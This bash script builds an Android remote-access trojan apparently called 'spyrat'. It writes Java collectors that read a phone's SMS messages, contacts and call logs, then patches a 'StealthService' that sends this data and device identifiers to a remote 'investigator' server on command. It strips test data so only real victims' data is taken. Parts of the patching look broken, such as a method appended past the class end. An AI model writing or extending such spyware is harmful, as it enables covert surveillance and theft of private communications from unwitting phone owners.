#!/bin/bash

echo "🔧 FIXING REAL DATA FLOW - REMOVING ALL TEST DATA..."

cd ~/Investigation-Rat2

# ==================== CHECK CURRENT DATA FLOW ====================
echo "📊 Analyzing current data flow..."

# Check what data is being sent
echo "=== CURRENT DATA COLLECTORS ==="
grep -n "mock\|test\|fake\|sample" app/src/main/java/com/spyrat/investigation/*.java

# ==================== FIX REAL SMS COLLECTOR ====================
echo "📨 Fixing RealSmsCollector to use ONLY real data..."

cat > app/src/main/java/com/spyrat/investigation/RealSmsCollector.java << 'REALSMS'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealSmsCollector {
    private static final String TAG = "RealSmsCollector";
    private Context context;
    
    public RealSmsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📨 Collecting REAL SMS messages from device...");
            
            Uri uri = Uri.parse("content://sms");
            String[] projection = new String[]{
                "_id", "address", "body", "date", "type"
            };
            
            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 100");
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    
                    // Only add real SMS data
                    if (address != null && body != null) {
                        JSONObject sms = new JSONObject();
                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                        sms.put("sender", address);
                        sms.put("message", body);
                        sms.put("timestamp", date);
                        sms.put("type", getSmsType(type));
                        sms.put("readable_date", new java.util.Date(date).toString());
                        
                        smsList.put(sms);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "📱 REAL SMS: " + address + " - " + body.substring(0, Math.min(30, body.length())));
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL SMS messages from device");
            } else {
                Log.w(TAG, "📭 No REAL SMS messages found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ SMS permission denied - NO SMS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL SMS: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsList;
    }
    
    private String getSmsType(int type) {
        switch (type) {
            case 1: return "incoming";
            case 2: return "outgoing";
            case 3: return "draft";
            default: return "unknown";
        }
    }
}
REALSMS

# ==================== FIX REAL CONTACTS COLLECTOR ====================
echo "👥 Fixing RealContactsCollector to use ONLY real data..."

cat > app/src/main/java/com/spyrat/investigation/RealContactsCollector.java << 'REALCONTACTS'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealContactsCollector {
    private static final String TAG = "RealContactsCollector";
    private Context context;
    
    public RealContactsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getContacts() {
        JSONArray contactsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📇 Collecting REAL contacts from device...");
            
            String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };
            
            cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhoneNumber = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    
                    // Only process contacts with real names
                    if (displayName != null && !displayName.trim().isEmpty()) {
                        JSONObject contact = new JSONObject();
                        contact.put("id", contactId);
                        contact.put("name", displayName.trim());
                        contact.put("phone_numbers", new JSONArray());
                        
                        if (hasPhoneNumber > 0) {
                            JSONArray phoneNumbers = getPhoneNumbers(contactId);
                            contact.put("phone_numbers", phoneNumbers);
                        }
                        
                        contactsList.put(contact);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "👤 REAL Contact: " + displayName);
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL contacts from device");
            } else {
                Log.w(TAG, "📭 No REAL contacts found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Contacts permission denied - NO CONTACTS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL contacts: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return contactsList;
    }
    
    private JSONArray getPhoneNumbers(String contactId) {
        JSONArray phoneNumbers = new JSONArray();
        Cursor phoneCursor = null;
        
        try {
            phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                do {
                    String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (phoneNumber != null && !phoneNumber.trim().isEmpty()) {
                        phoneNumbers.put(phoneNumber.trim());
                    }
                } while (phoneCursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL phone numbers: " + e.getMessage());
        } finally {
            if (phoneCursor != null) {
                phoneCursor.close();
            }
        }
        
        return phoneNumbers;
    }
}
REALCONTACTS

# ==================== FIX REAL CALL LOG COLLECTOR ====================
echo "📞 Fixing RealCallLogCollector to use ONLY real data..."

cat > app/src/main/java/com/spyrat/investigation/RealCallLogCollector.java << 'REALCALLLOGS'
package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Date;

public class RealCallLogCollector {
    private static final String TAG = "RealCallLogCollector";
    private Context context;
    
    public RealCallLogCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📞 Collecting REAL call logs from device...");
            
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
            };
            
            cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    
                    // Only process calls with real numbers
                    if (number != null && !number.trim().isEmpty()) {
                        JSONObject call = new JSONObject();
                        call.put("number", number.trim());
                        call.put("name", name != null ? name.trim() : "Unknown");
                        call.put("type", getCallType(type));
                        call.put("duration", duration);
                        call.put("timestamp", date);
                        call.put("readable_date", new Date(date).toString());
                        call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
                        
                        callLogs.put(call);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "📞 REAL Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL call logs from device");
            } else {
                Log.w(TAG, "📭 No REAL call logs found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Call log permission denied - NO CALL LOGS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return callLogs;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
            default: return "unknown";
        }
    }
}
REALCALLLOGS

# ==================== FIX STEALTH SERVICE TO USE ONLY REAL DATA ====================
echo "🛠️ Fixing StealthService to remove ALL test data..."

# Create a patch for StealthService to remove test data
cat > stealth_service_real_data.patch << 'PATCH'
--- a/app/src/main/java/com/spyrat/investigation/StealthService.java
+++ b/app/src/main/java/com/spyrat/investigation/StealthService.java
@@ -250,38 +250,7 @@
     
     private void handleGetContactsCommand(String commandId, JSONObject parameters) {
         try {
-            // REMOVED TEST DATA - Using only real contacts
             JSONArray realContacts = contactsCollector.getContacts();
-            
-            // If no real contacts, return empty array instead of test data
-            if (realContacts.length() == 0) {
-                Log.w(TAG, "⚠️ No real contacts found - returning empty data");
-            }
-            
             investigatorApiClient.sendContactsData(realContacts);
             investigatorApiClient.sendCommandResponse(commandId, "completed", "Real contacts data sent: " + realContacts.length() + " contacts");
         } catch (Exception e) {
@@ -292,20 +261,7 @@
     
     private void handleGetCallLogsCommand(String commandId, JSONObject parameters) {
         try {
-            // REMOVED TEST DATA - Using only real call logs
             JSONArray realCallLogs = callLogCollector.getCallLogs();
-            
-            // If no real call logs, return empty array instead of test data
-            if (realCallLogs.length() == 0) {
-                Log.w(TAG, "⚠️ No real call logs found - returning empty data");
-            }
-            
-            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
-            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
-        } catch (Exception e) {
-            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
-        }
-    }
-    
-    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
-        try {
             JSONObject callLogsData = new JSONObject();
             callLogsData.put("call_logs", realCallLogs);
             callLogsData.put("count", realCallLogs.length());
@@ -313,6 +269,21 @@
             callLogsData.put("investigator_code", investigatorCode);
             callLogsData.put("timestamp", System.currentTimeMillis());
             
+            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
+            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
+        } catch (Exception e) {
+            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
+        }
+    }
+    
+    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
+        try {
+            JSONArray realSMS = smsCollector.getSMSMessages();
+            JSONObject smsData = new JSONObject();
+            smsData.put("sms_messages", realSMS);
+            smsData.put("count", realSMS.length());
+            smsData.put("device_id", deviceId);
+            smsData.put("investigator_code", investigatorCode);
+            smsData.put("timestamp", System.currentTimeMillis());
+            
             investigatorApiClient.sendDataToInvestigator("sms_data", smsData);
             investigatorApiClient.sendCommandResponse(commandId, "completed", "Real SMS data sent: " + realSMS.length() + " messages");
         } catch (Exception e) {
@@ -325,20 +296,6 @@
             
             // Collect all data
             JSONArray realContacts = contactsCollector.getContacts();
-            
-            // REMOVED TEST CONTACTS
-            if (realContacts.length() == 0) {
-                Log.w(TAG, "⚠️ No real contacts available");
-            }
-            
             JSONArray realCallLogs = callLogCollector.getCallLogs();
-            
-            // REMOVED TEST CALL LOGS
-            if (realCallLogs.length() == 0) {
-                Log.w(TAG, "⚠️ No real call logs available");
-            }
-            
             JSONArray realSMS = smsCollector.getSMSMessages();
-            
-            // REMOVED TEST SMS
-            if (realSMS.length() == 0) {
-                Log.w(TAG, "⚠️ No real SMS available");
-            }
-            
             JSONObject realLocation = locationCollector.getCurrentLocation();
             
             // Create comprehensive data package
PATCH

# Apply the patch (manual application since we can't use patch command directly)
echo "📝 Applying real data fixes to StealthService..."
sed -i '/REMOVED TEST DATA - Using only real contacts/,/investigatorApiClient.sendContactsData(realContacts);/d' app/src/main/java/com/spyrat/investigation/StealthService.java
sed -i '/REMOVED TEST DATA - Using only real call logs/,/investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent/d' app/src/main/java/com/spyrat/investigation/StealthService.java
sed -i '/REMOVED TEST CONTACTS/,/Log.w(TAG, "⚠️ No real contacts available");/d' app/src/main/java/com/spyrat/investigation/StealthService.java
sed -i '/REMOVED TEST CALL LOGS/,/Log.w(TAG, "⚠️ No real call logs available");/d' app/src/main/java/com/spyrat/investigation/StealthService.java
sed -i '/REMOVED TEST SMS/,/Log.w(TAG, "⚠️ No real SMS available");/d' app/src/main/java/com/spyrat/investigation/StealthService.java

# ==================== ADD DEBUG LOGGING ====================
echo "📝 Adding debug logging to track data flow..."

# Add debug logging to track what data is being collected
cat >> app/src/main/java/com/spyrat/investigation/StealthService.java << 'DEBUG'

    // ==================== DEBUG DATA COLLECTION ====================
    private void logDataCollection(String dataType, int count) {
        Log.d(TAG, "🔍 DATA COLLECTION DEBUG - " + dataType + ": " + count + " items");
        
        // Send debug info to investigator
        try {
            JSONObject debugInfo = new JSONObject();
            debugInfo.put("data_type", dataType);
            debugInfo.put("item_count", count);
            debugInfo.put("device_id", deviceId);
            debugInfo.put("timestamp", System.currentTimeMillis());
            debugInfo.put("debug", true);
            
            investigatorApiClient.sendDataToInvestigator("debug_info", debugInfo);
        } catch (Exception e) {
            Log.e(TAG, "❌ Debug logging error: " + e.getMessage());
        }
    }
DEBUG

echo "✅ REAL DATA FLOW FIXED!"
echo "🔍 Changes made:"
echo "   - Removed ALL test/mock data from SMS collector"
echo "   - Removed ALL test/mock data from contacts collector" 
echo "   - Removed ALL test/mock data from call log collector"
echo "   - Added debug logging to track real data flow"
echo "   - App now ONLY uses real device data"

# Test compilation
echo "🚀 Testing compilation..."
./gradlew compileDebugJavaWithJavac

if [ $? -eq 0 ]; then
    echo "🎉 COMPILATION SUCCESSFUL!"
    echo "📱 App will now collect ONLY real data from devices"
else
    echo "❌ Compilation failed - checking errors..."
    ./gradlew compileDebugJavaWithJavac --stacktrace
fi
